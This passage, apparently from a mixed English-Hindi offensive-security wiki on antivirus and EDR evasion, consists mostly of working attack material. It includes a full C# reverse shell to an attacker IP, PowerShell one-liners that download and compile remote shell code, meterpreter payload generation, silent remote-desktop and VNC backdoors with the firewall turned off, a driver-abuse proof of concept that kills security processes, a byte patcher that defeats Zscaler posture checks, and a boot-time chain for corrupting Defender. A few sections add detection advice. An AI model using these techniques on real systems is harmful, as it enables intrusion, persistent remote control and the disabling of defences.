SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से डाउनलोड की गई फ़ाइल के लिए Zone.Identifier ADS की जाँच।</p></figcaption></figure>

> [!TIP]
> यह ध्यान देने योग्य है कि ऐसे executables जो किसी trusted signing certificate के साथ signed होते हैं, वह SmartScreen को trigger नहीं करेंगे।

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक शक्तिशाली logging mechanism है जो applications और system components को **log events** करने की अनुमति देता है। हालांकि, इसे security products द्वारा malicious activities को monitor और detect करने के लिए भी उपयोग किया जा सकता है।

जिस तरह AMSI को disable (bypass) किया जाता है, उसी तरह user space प्रक्रिया के **`EtwEventWrite`** फ़ंक्शन को तुरंत return करवा देना संभव है ताकि कोई इवेंट लॉग न हो। यह फ़ंक्शन को memory में patch करके किया जाता है ताकि वह तुरंत return कर दे, जिससे उस प्रक्रिया के लिए ETW logging प्रभावी रूप से disabled हो जाता है।

आप अधिक जानकारी यहां पा सकते हैं: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# बाइनरीज़ को memory में लोड करना काफी समय से जाना-पहचाना तरीका है और यह अभी भी आपके post-exploitation tools को AV द्वारा पकड़े बिना चलाने का एक शानदार तरीका है।

चूँकि payload सीधे memory में लोड हो जाएगा और disk को छुएगा नहीं, हमें पूरे process के लिए केवल AMSI को patch करने की चिंता करनी होगी।

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की क्षमता प्रदान करती हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

यह **एक नया sacrificial process spawn** करने, उस नए process में आपका post-exploitation malicious code inject करने, अपना malicious code execute करने और समाप्त होने पर नए process को kill करने को शामिल करता है। इसके फायदे और नुकसान दोनों हैं। Fork and run विधि का लाभ यह है कि execution हमारे Beacon implant process के **बाहर** होती है। इसका मतलब है कि अगर हमारी post-exploitation कार्रवाई में कुछ गलत हो जाए या पकड़ा जाए, तो हमारे **implant के बचने** की संभावना **काफी अधिक** होती है। नुकसान यह है कि Behavioural Detections द्वारा पकड़े जाने की आपकी **संभावना अधिक** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह अपने ही process में post-exploitation malicious code **inject** करने के बारे में है। इस तरह आप एक नया process बनाने और उसे AV द्वारा scan करवाने से बच सकते हैं, लेकिन कमी यह है कि अगर आपके payload के execution के साथ कुछ गलत हो जाता है, तो आपका beacon crash हो सकता है और आपको **बेहद अधिक संभावना** है कि आप अपना beacon **खो दें**।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> अगर आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो इस लेख को देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies **from PowerShell** से भी लोड कर सकते हैं, देखें [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), यह संभव है कि अन्य भाषाओं का उपयोग करके malicious code execute किया जाए अगर compromised machine को **the interpreter environment installed on the Attacker Controlled SMB share** तक पहुँच दी जाए।

SMB share पर Interpreter Binaries और environment को एक्सेस देने से आप compromised मशीन की memory के भीतर इन भाषाओं में **execute arbitrary code in these languages within memory** कर सकते हैं।

रिपो बताता है: Defender अभी भी scripts को scan करता है लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने में अधिक लचीलापन** है। इन भाषाओं में random un-obfuscated reverse shell scripts के साथ परीक्षण सफल रहा है।

## TokenStomping

Token stomping एक तकनीक है जो attacker को अनुमति देती है कि वह access token या EDR या AV जैसे किसी security product को **manipulate** करे, जिससे वे उसके privileges घटा सकें ताकि प्रक्रिया मर न जाए पर उसके पास malicious activities जांचने की permissions न रहें।

Windows इसे रोकने के लिए **external processes** को security processes के tokens पर handles प्राप्त करने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में वर्णित है, यह आसान है कि आप पीड़ित के PC में Chrome Remote Desktop तैनात करें और फिर इसका उपयोग takeover और persistence बनाए रखने के लिए करें:
1. https://remotedesktop.google.com/ से डाउनलोड करें, "Set up via SSH" पर क्लिक करें, और फिर Windows के लिए MSI फ़ाइल डाउनलोड करने के लिए MSI फ़ाइल पर क्लिक करें।
2. पीड़ित पर इंस्टॉलर को silently चलाएँ (admin आवश्यक): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop पेज पर वापस जाएँ और next पर क्लिक करें। विज़ार्ड आपको authorize करने के लिए कहेगा; जारी रखने के लिए Authorize बटन पर क्लिक करें।
4. दिए गए पैरामीटर को कुछ समायोजनों के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (नोट: pin param आपको GUI का उपयोग किए बिना pin सेट करने की अनुमति देता है).

## Advanced Evasion

Evasion एक बहुत जटिल विषय है, कभी-कभी आपको एक ही सिस्टम में कई अलग-अलग telemetry स्रोतों को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

हर environment जिसकी आप समीक्षा करते हैं, उसके अपने strengths और weaknesses होंगे।

मैं आपको प्रोत्साहित करता हूँ कि आप [@ATTL4S](https://twitter.com/DaniLJ94) की यह टॉक देखें, ताकि आप Advanced Evasion तकनीकों में एक foothold प्राप्त कर सकें।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth पर एक और बेहतरीन टॉक भी है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो बाइनरी के हिस्सों को **हटा** देगा जब तक कि यह **पता न लगा ले कि Defender किस हिस्से को malicious मान रहा है** और उसे आप तक विभाजन करके पहुँचा देगा।\
एक और टूल जो यही काम करता है वह है [**avred**](https://github.com/dobin/avred) और इसकी सर्विस वेब पर उपलब्ध है [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, सभी Windows में एक **Telnet server** आता था जिसे आप (administrator के रूप में) इंस्टॉल कर सकते थे करके:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
सिस्टम के शुरू होते ही इसे **start** कराएँ और इसे अभी **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port बदलें** (stealth) और firewall को अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**ON THE HOST**: _**winvnc.exe**_ को चलाएँ और सर्वर कॉन्फ़िगर करें:

- विकल्प _Disable TrayIcon_ को सक्षम करें
- _VNC Password_ में पासवर्ड सेट करें
- _View-Only Password_ में पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नया** बनाया गया फ़ाइल _**UltraVNC.ini**_ को **victim** के अंदर स्थानांतरित करें।

#### **Reverse connection**

**attacker** को अपने **host** पर बाइनरी `vncviewer.exe -listen 5900` **अंदर चलाना** चाहिए ताकि यह reverse **VNC connection** पकड़ने के लिए **तैयार** रहे। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` शुरू करें और चलाएँ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** गुप्तता बनाए रखने के लिए आपको कुछ चीज़ें नहीं करनी चाहिए

- यदि `winvnc` पहले से चल रहा है तो इसे न चलाएँ, वरना आप एक [popup](https://i.imgur.com/1SROTTl.png) ट्रिगर कर देंगे। `tasklist | findstr winvnc` से जांचें कि यह चल रहा है
- उसी निर्देशिका में `UltraVNC.ini` के बिना `winvnc` न चलाएँ अन्यथा यह [the config window](https://i.imgur.com/rfMQWcf.png) खोल देगा
- `winvnc -h` मदद के लिए न चलाएँ वरना आप एक [popup](https://i.imgur.com/oc18wcu.png) ट्रिगर कर देंगे

### GreatSCT

इसे डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब **lister** को `msfconsole -r file.rc` से शुरू करें और **xml payload** को निम्नानुसार **execute** करें:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान Defender बहुत जल्दी प्रक्रिया को समाप्त कर देगा।**

### हमारी अपनी reverse shell को कंपाइल करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Reverse shell

इसे कंपाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे निम्न के साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# कंपाइलर का उपयोग
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### build injectors बनाने के लिए python का उपयोग — उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### और

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space से AV/EDR को नष्ट करना

Storm-2603 ने एक छोटी console utility जिसे **Antivirus Terminator** कहा जाता है, का उपयोग endpoint सुरक्षा को डिसेबल करने के लिए किया था इससे पहले कि यह ransomware डाले। यह टूल अपना **खुद का vulnerable परंतु *signed* ड्राइवर** लाता है और इसे दुरुपयोग करके privileged kernel ऑपरेशन्स जारी करता है जिन्हें Protected-Process-Light (PPL) AV सेवाएँ भी ब्लॉक नहीं कर सकतीं।

मुख्य बिंदु
1. **साइन किए गए ड्राइवर**: डिस्क पर डिलीवर की गई फाइल `ServiceMouse.sys` है, लेकिन बाइनरी वास्तव में Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से साइन किया हुआ ड्राइवर `AToolsKrnl64.sys` है। क्योंकि ड्राइवर पर मान्य Microsoft सिग्नेचर है, यह तब भी लोड होता है जब Driver-Signature-Enforcement (DSE) सक्षम होता है।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली लाइन ड्राइवर को एक **kernel service** के रूप में रजिस्टर करती है और दूसरी लाइन इसे शुरू कर देती है ताकि `\\.\ServiceMouse` user land से पहुँच योग्य हो जाए।
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा किसी भी प्रक्रिया को समाप्त करना (Defender/EDR सेवाओं को खत्म करने के लिए उपयोग किया गया) |
| `0x990000D0` | डिस्क पर किसी भी फाइल को डिलीट करना |
| `0x990001D0` | ड्राइवर को अनलोड करना और सर्विस को हटाना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **क्यों यह काम करता है**: BYOVD पूरी तरह से user-mode सुरक्षा को स्किप कर देता है; kernel में 실행 होने वाला कोड *protected* processes को खोल सकता है, उन्हें समाप्त कर सकता है, या kernel ऑब्जेक्ट्स के साथ छेड़छाड़ कर सकता है, चाहे PPL/PP, ELAM या अन्य hardening सुविधाएँ मौजूद हों।

पता लगाने / निवारण
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) को सक्षम करें ताकि Windows `AToolsKrnl64.sys` को लोड करने से इनकार कर दे।  
•  नए *kernel* सर्विसेस के निर्माण की निगरानी करें और अलर्ट करें जब किसी world-writable निर्देशिका से ड्राइवर लोड हो या वह allow-list पर मौजूद न हो।  
•  custom device objects के लिए user-mode handles और उसके बाद suspicious `DeviceIoControl` कॉल्स पर नज़र रखें।

### Zscaler Client Connector Posture Checks को On-Disk Binary Patching के द्वारा बाईपास करना

Zscaler’s Client Connector स्थानीय रूप से device-posture rules लागू करता है और परिणामों को अन्य कंपोनेंट्स तक पहुँचाने के लिए Windows RPC पर निर्भर करता है। दो कमजोर डिजाइन विकल्प एक पूर्ण बाईपास संभव बनाते हैं:

1. Posture evaluation पूरी तरह client-side पर होता है (एक boolean सर्वर को भेजा जाता है)।  
2. Internal RPC endpoints केवल यह मान्य करते हैं कि connecting executable **Zscaler द्वारा साइन** किया गया है (via `WinVerifyTrust`)।

डिस्क पर चार signed binaries को पैच करके दोनों मेकैनिज्म को निष्क्रिय किया जा सकता है:

| बाइनरी | मूल लॉजिक में पैच | परिणाम |
|--------|-------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` रिटर्न करता है ताकि हर चेक compliant हो |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned) process RPC pipes को bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से बदला गया |
| `ZSATunnel.exe` | Tunnel पर integrity checks | Short-circuited |

न्यूनतम पैचर अंश:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **सभी** पोज़चर चेक्स **हरे/अनुपालक** दिखते हैं।
* अनसाइन किए गए या संशोधित बाइनरी नामित-पाइप RPC endpoints खोल सकते हैं (उदा. `\\RPC Control\\ZSATrayManager_talk_to_me`)।
* समझौता किया गया होस्ट Zscaler नीतियों द्वारा परिभाषित आंतरिक नेटवर्क तक बिना प्रतिबंध के पहुँच प्राप्त कर लेता है।

यह केस स्टडी दिखाती है कि कैसे केवल क्लाइंट-साइड ट्रस्ट निर्णय और साधारण सिग्नेचर जाँच कुछ बाइट पैचेस से पराजित किये जा सकते हैं।

## Protected Process Light (PPL) का दुरुपयोग करके AV/EDR के साथ LOLBINs से छेड़छाड़

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है ताकि केवल समान-या-ऊँचे सुरक्षित प्रक्रियाएँ ही एक-दूसरे को छेड़छाड़ कर सकें। आक्रामक दृष्टिकोण से, यदि आप वैध रूप से एक PPL-enabled बाइनरी लॉन्च कर सकें और उसके arguments को नियंत्रित कर सकें, तो आप बेनिग्न फ़ंक्शनलिटी (उदा., logging) को एक सीमित, PPL-backed write primitive में बदल सकते हैं जो AV/EDR द्वारा उपयोग किए जाने वाले संरक्षित निर्देशिकाओं के खिलाफ काम करे।

एक प्रक्रिया को PPL के रूप में चलाने के लिए क्या आवश्यक है
- लक्ष्य EXE (और कोई भी लोडेड DLLs) को PPL-capable EKU के साथ साइन किया होना चाहिए।
- प्रक्रिया को CreateProcess का उपयोग करके निम्न flags के साथ बनाया जाना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- एक संगत protection level अनुरोधित किया जाना चाहिए जो बाइनरी के signer से मेल खाता हो (उदा., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` anti-malware signers के लिए, `PROTECTION_LEVEL_WINDOWS` Windows signers के लिए)। गलत स्तर creation पर असफल होगा।

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

लॉन्चर टूलिंग
- ओपन-सोर्स हेल्पर: CreateProcessAsPPL (protection level चुनता है और arguments को लक्ष्य EXE को फॉरवर्ड करता है):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- उपयोग पैटर्न:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN प्रिमिटिव: ClipUp.exe
- साइन किए गए सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` स्वयं-स्पॉन करता है और कॉलर-निर्दिष्ट पाथ पर लॉग फ़ाइल लिखने के लिए एक पैरामीटर स्वीकार करता है.
- जब इसे PPL प्रोसेस के रूप में लॉन्च किया जाता है, फ़ाइल लिखना PPL बैकिंग के साथ होता है.
- ClipUp स्पेस वाले पाथ्स को पार्स नहीं कर सकता; सामान्यतः संरक्षित लोकेशनों को इंगित करने के लिए 8.3 short paths का उपयोग करें.

8.3 short path सहायक
- शॉर्ट नाम सूचीबद्ध करें: `dir /x` प्रत्येक parent directory में.
- cmd में शॉर्ट पाथ निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ लॉन्च करें, किसी launcher (उदा., CreateProcessAsPPL) का उपयोग करते हुए.
2) ClipUp को log-path आर्गुमेंट पास करें ताकि एक प्रोटेक्टेड AV डायरेक्टरी (उदा., Defender Platform) में फ़ाइल बनाई जा सके। आवश्यकता होने पर 8.3 short names का उपयोग करें.
3) यदि target बाइनरी आमतौर पर AV द्वारा रन करते समय खुली/लॉक रहती है (उदा., MsMpEng.exe), तो AV शुरू होने से पहले बूट पर लिखने के लिए एक auto-start service इंस्टॉल करके शेड्यूल करें जो विश्वसनीय रूप से पहले चले। Process Monitor (boot logging) के साथ बूट ऑर्डरिंग वैलिडेट करें.
4) रिबूट पर PPL-backed write AV द्वारा बाइनरियों को लॉक करने से पहले होता है, जिससे target फ़ाइल करप्ट हो जाती है और startup रोक जाता है.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
नोट्स और सीमाएँ
- आप ClipUp द्वारा लिखी जाने वाली सामग्री को स्थान के अलावा नियंत्रित नहीं कर सकते; यह primitive सटीक सामग्री इंजेक्शन की तुलना में भ्रष्टाचार के लिए उपयुक्त है।
- सेवा install/start करने और रीबूट विंडो के लिए local admin/SYSTEM आवश्यक है।
- समय महत्वपूर्ण है: लक्ष्य खुला नहीं होना चाहिए; बूट-टाइम निष्पादन फाइल लॉक से बचाता है।

डिटेक्शन
- `ClipUp.exe` के असामान्य arguments के साथ प्रोसेस बनना, विशेषकर जब इसका parent non-standard launchers हो और यह बूट के दौरान/आसपास हो।
- नई सेवाएँ जो auto-start के लिए संदिग्ध binaries को कॉन्फ़िगर करती हैं और लगातार Defender/AV से पहले शुरू होती हैं। Defender के startup विफलताओं से पहले की service creation/modification की जाँच करें।
- Defender binaries/Platform निर्देशिकाओं पर file integrity monitoring; protected-process flags वाले प्रोसेसों द्वारा अनपेक्षित फाइल निर्माण/परिवर्तन।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए प्रोसेस और non-AV binaries द्वारा असामान्य PPL स्तर के उपयोग पर नज़र रखें।

निवारण
- WDAC/Code Integrity: सीमित करें कि कौन से signed binaries PPL के रूप में और किन parent के अंतर्गत चल सकते हैं; legitimate contexts के बाहर ClipUp के invocation को ब्लॉक करें।
- Service hygiene: auto-start सेवाओं की creation/modification को सीमित करें और start-order में हेरफेर की निगरानी करें।
- पुष्टि करें कि Defender tamper protection और early-launch protections सक्षम हैं; binary corruption सूचित करने वाले startup errors की जांच करें।
- यदि आपकी वातावरण के साथ compatible हो तो security tooling होस्ट करने वाले वॉल्यूम्स पर 8.3 short-name generation को अक्षम करने पर विचार करें (पूरी तरह परीक्षण करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## संदर्भ

